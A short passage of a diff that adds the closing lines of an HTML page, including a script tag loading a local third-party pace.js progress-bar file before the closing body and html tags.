+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
